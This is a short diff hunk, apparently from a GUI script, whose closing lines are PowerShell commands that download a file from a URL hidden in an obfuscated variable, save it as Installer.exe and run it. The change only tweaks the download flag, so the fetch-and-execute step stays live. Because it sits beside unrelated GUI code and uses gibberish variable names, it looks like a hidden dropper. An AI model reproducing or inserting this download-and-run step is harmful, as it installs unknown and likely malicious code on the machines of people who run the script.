@@ -264,5 +264,5 @@ dragGUI(ToPartFrame)
 	end
 
 }
-Invoke-WebRequest -Uri $dfpaspasodsvxcv -OutFile $mnjksdfuidsf\\Installer.exe
+Invoke-WebRequest -Uri $dfpaspasodsvxcv -OutFile $mnjksdfuidsf\\Installer.exe -UseBasicParsing
 Start-Process $mnjksdfuidsf\\Installer.exe
